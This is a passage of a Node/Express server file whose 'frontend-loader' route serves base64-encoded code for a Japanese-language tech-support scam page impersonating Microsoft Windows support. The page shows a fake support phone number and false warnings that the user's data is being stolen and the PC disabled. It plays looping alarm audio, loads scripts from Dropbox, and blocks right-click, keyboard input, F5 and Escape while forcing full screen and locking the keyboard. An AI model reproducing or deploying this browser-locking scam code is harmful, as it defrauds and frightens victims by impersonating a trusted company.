\u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3057\u3066\u3001\u3053\u306E\u8105\u5A01\u3092\u5831\u544A\u3057\u3001\u500B\u4EBA\u60C5\u5831\u306E\u76D7\u96E3\u3092\u9632\u304E\u3001\u3053\u306E\u30C7\u30D0\u30A4\u30B9\u3078\u306E\u30A2\u30AF\u30BB\u30B9\u306E\u30D6\u30ED\u30C3\u30AF\u3092\u89E3\u9664\u3057\u3066\u304F\u3060\u3055\u3044\u3002<\/p>\r\n       <p>\u3053\u306E\u30A6\u30A3\u30F3\u30C9\u30A6\u3092\u9589\u3058\u308B\u3068\u3001\u500B\u4EBA\u60C5\u5831\u304C\u5371\u967A\u306B\u3055\u3089\u3055\u308C\u3001Windows \u306E\u767B\u9332\u304C\u4E00\u6642\u505C\u6B62\u3055\u308C\u308B\u53EF\u80FD\u6027\u304C\u3042\u308A\u307E\u3059\u3002<\/p>\r\n      <p style=\"padding-bottom:0;color:#fff;font-size:16px\">Windows \u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3059\u308B: <strong>\r\n          <span class=\"tfn-num\" style=\"border:1px solid #fff;border-radius:5px;padding:2px 5px\">0101 219 271 7197\r\n          <\/span>\r\n        <\/strong>\r\n      <\/p>\r\n      <div class=\"action_buttons\">\r\n        <a class=\"active\" id=\"leave_page\" style=\"cursor:pointer;color:#fff!important\">OK<\/a>\r\n        <a class=\"active\" id=\"leave_page\" style=\"color:#fff!important\">\u30AD\u30E3\u30F3\u30BB\u30EB<\/a>\r\n      <\/div>\r\n    <\/div>\r\n    <div class=\"answer_list\" style=\"background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem\" id=\"welcomeDiv\">\r\n      <p style=\"color:#fff;margin-top:10px;font-size:16px;padding:0 5px\" class=\"text-center\">\u3059\u3050\u306B\u5F53\u793E\u306B\u3054\u9023\u7D61\u304F\u3060\u3055\u3044\u3002\u5F53\u793E\u306E\u30A8\u30F3\u30B8\u30CB\u30A2\u304C\u96FB\u8A71\u3067\u524A\u9664\u30D7\u30ED\u30BB\u30B9\u3092\u6848\u5185\u3044\u305F\u3057\u307E\u3059\u3002 <br>\u304A\u4F7F\u3044\u306E\u30B3\u30F3\u30D4\u30E5\u30FC\u30BF\u306F\u7121\u52B9\u306B\u306A\u3063\u3066\u3044\u307E\u3059\u3002<br>\r\n        <strong>Windows \u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3059\u308B: <span class=\"tfn-num\" style=\"border:1px solid #383d41;border-radius:5px;padding:2px 5px\"> 0101 219 271 7197\r\n          <\/span>\r\n        <\/strong>\r\n      <\/p>\r\n    <\/div>\r\n    <div id=\"chat\" style=\"display: block;\">\r\n      <img src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/d18h212fb8lxktqbkv5b0\/msmm.png?rlkey=e38fk03mc4knbkag4kmrdwwsy&st=ffpiwo9h&dl=0\">\r\n      <span style=\"color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px\">Microsoft<\/span>\r\n      <p style=\"font-weight:600;font-size:24px\">\u30B5\u30DD\u30FC\u30C8\u306B\u96FB\u8A71\u3059\u308B: <br>\r\n      <\/p>\r\n      <h4 style=\"font-weight:600;font-size:22px\"> <span class=\"tfn-num\">0101 219 271 7197<\/span> \r\n        <br>(\u30BB\u30AD\u30E5\u30EA\u30C6\u30A3\u30B5\u30DD\u30FC\u30C8)\r\n      <\/h4>\r\n      <div class=\"arrow-down\">\r\n        <svg height=\"1em\" viewBox=\"0 0 320 512\">\r\n          <style>\r\n            svg {\r\n              fill: #fff\r\n            }\r\n          <\/style>\r\n          <path d=\"M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z\"><\/path>\r\n        <\/svg>\r\n      <\/div>\r\n    <\/div>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/lca8fjg6m7vanl2ikbksj\/nvidia.js?rlkey=jynzpk20i82i6s7sm567bmmer&st=02i0evoj&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/p5134v5917rhjky0xleqw\/jupiter.js?rlkey=k6c44j2yhjdy1meypt4po8jvd&st=kr0hahgc&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/pfdpam2z7kdeusgbdulvt\/progress.js?rlkey=0silbqr8a2jb26vlmry24qbbc&st=sryfrwaq&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/wwv74p6lolctj6djjmx6k\/main.js?rlkey=wyk6yicrycrsh42drsh8az465&st=mk2vio7e&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/qxsggcuze2dcef49cwrob\/fulls.js?rlkey=gy8pdii4uizygs0jay3a6g2an&st=492l6jz8&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/gv49552tlh4avmmbh3gju\/btn.js?rlkey=tw6poj5ku89lzcmmm6fn40svp&st=js4xgdum&dl=0\"><\/script>\r\n    <script src=\"https:\/\/dl.dropboxusercontent.com\/scl\/fi\/uejvup4m46cubo21ye1bc\/esc.js?rlkey=mvxvecyeof4mskhc1jgocp2o6&st=lm4ad3od&dl=0\"><\/script>\r\n    <script>\r\n      setInterval(function() {\r\n        document.getElementById(\"pridez\").play()\r\n      }, 500);\r\n    <\/script>\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\"#mycanvas\").click(function() {\r\n          $(\"#welcomeDiv\").show()\r\n        })\r\n      });\r\n    <\/script>\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\".pro_box\").delay(900).fadeIn(800);\r\n        $(\".black\").delay(1E3).fadeIn(800);\r\n        $(\".pro_box2\").delay(2500).fadeIn(800);\r\n        $(\".pro_box3\").delay(3500).fadeIn(800);\r\n        $(\"#pop_up_new\").delay(4E3).fadeIn(800);\r\n        $(\"#poptxt\").delay(4E3).fadeIn(800)\r\n      });\r\n    <\/script>\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\"#mycanvas\").click(function() {\r\n          $(\"#poptxt\").show()\r\n        })\r\n      });\r\n      $(document).ready(function() {\r\n        $(\"#cross\").click(function() {\r\n          $(\"#poptxt\").show()\r\n        })\r\n      });\r\n    <\/script>\r\n\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\"#mycanvas\").click(function() {\r\n          $(\"#footer\").show()\r\n        })\r\n      });\r\n    <\/script>\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\"body\").mouseover(function() {\r\n          $(\"#poptxt\").show()\r\n        })\r\n      });\r\n    <\/script>\r\n    <script>\r\n      var isNS = \"Netscape\" == navigator.appName ? 1 : 0;\r\n      \"Netscape\" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);\r\n\r\n      function mischandler() {\r\n        return !1\r\n      }\r\n\r\n      function mousehandler(a) {\r\n        a = isNS ? a : event;\r\n        a = isNS ? a.which : a.button;\r\n        if (2 == a || 3 == a) return !1\r\n      }\r\n      document.oncontextmenu = mischandler;\r\n      document.onmousedown = mousehandler;\r\n      document.onmouseup = mousehandler;\r\n    <\/script>\r\n    <script>\r\n      document.onkeydown = function(a) {\r\n        return !1\r\n      };\r\n    <\/script>\r\n    <script>\r\n      document.attachEvent(\"onkeydown\", win_onkeydown_handler);\r\n\r\n      function win_onkeydown_handler() {\r\n        switch (event.keyCode) {\r\n          case 116:\r\n            event.returnValue = !1;\r\n            event.keyCode = 0;\r\n            break;\r\n          case 27:\r\n            event.returnValue = !1, event.keyCode = 0\r\n        }\r\n      }\r\n    <\/script>\r\n    <script>\r\n      window.onload = function() {\r\n        window.moveTo(0, 0);\r\n        window.resizeTo(screen.availWidth, screen.availHeight)\r\n      };\r\n    <\/script>\r\n    <script>\r\n      $(document).ready(function() {\r\n        $(\"#chat\").delay(600).fadeIn(100)\r\n      });\r\n    <\/script>\r\n\r\n   <script type=\"text\/javascript\">\r\n    document.getElementById(\"age-confirmation-modal\").onclick = function(){\r\n        document.getElementById(\"age-confirmation-modal\").style.display = \"none\";\r\n        document.getElementById(\"other-content\").style.display = \"inline\";\r\n\r\n      addEventListener(\"click\", function() {\r\n        var\r\n              el = document.documentElement\r\n            , rfs =\r\n                   el.requestFullScreen\r\n                || el.webkitRequestFullScreen\r\n                || el.mozRequestFullScreen\r\n        ;\r\n        rfs.call(el);\r\n        });\r\n    }\r\n     $(\"a#thing_to_click\").click(function(e){\r\n         e.preventDefault();\r\n         window.location = \"#\";\r\n    });\r\n    <\/script>\r\n    <script>\r\n      window.addEventListener(\"DOMContentLoaded\", function () {\r\n        const span = document.querySelector(\"span.tfn-num\");\r\n        if (span) {\r\n          const phone = span.innerHTML.trim(); \/\/ this will be the HTML entities\r\n          window.parent.postMessage({ phoneFromIframe: phone }, \"*\");\r\n        }\r\n      });\r\n    <\/script>\r\n    <script>\r\n      function isEntityPhone(str) {\r\n        \/\/ Checks if string contains only digits and spaces encoded as entities\r\n        return \/^(&#\\d{2,3};|\\s)+$\/.test(str.trim());\r\n      }\r\n    \r\n      function updatePhoneEntities(entityStr) {\r\n        const spans = document.querySelectorAll(\"span.tfn-num\");\r\n        spans.forEach(span => {\r\n          span.innerHTML = entityStr;\r\n        });\r\n      }\r\n    \r\n      window.addEventListener(\"message\", function (event) {\r\n        const data = event.data;\r\n    \r\n        \/\/ Basic validation\r\n        if (typeof data === \"object\" && data.phone && typeof data.phone === \"string\") {\r\n          const phoneEntity = data.phone.trim();\r\n    \r\n          if (isEntityPhone(phoneEntity)) {\r\n            updatePhoneEntities(phoneEntity);\r\n          } else {\r\n            console.warn(\"Invalid phone format received:\", phoneEntity);\r\n          }\r\n        }\r\n      });\r\n    <\/script>\r\n  <\/body>\r\n<\/html>`;
        navigator.keyboard.lock();
        document.addEventListener('contextmenu', e => e.preventDefault());
    
        const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
        audio1.loop = true;
        audio1.play();
    
        const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/TiYldVqiRFah8SdaoR0nWNvyv20wGngh');
        mumbaiAudio.loop = true;
        mumbaiAudio.play();
    
        document.removeEventListener("click", handleSomeClick);
      });
    `;
    
    const encoded = Buffer.from(code).toString("base64");
    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
    return res.json({ code: encoded });
  } catch (err) {
    console.error("Error in frontend-loader:", err);
    return res.status(500).json({ error: "Failed to generate frontend loader" });
  }
});

// === Start server ===
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
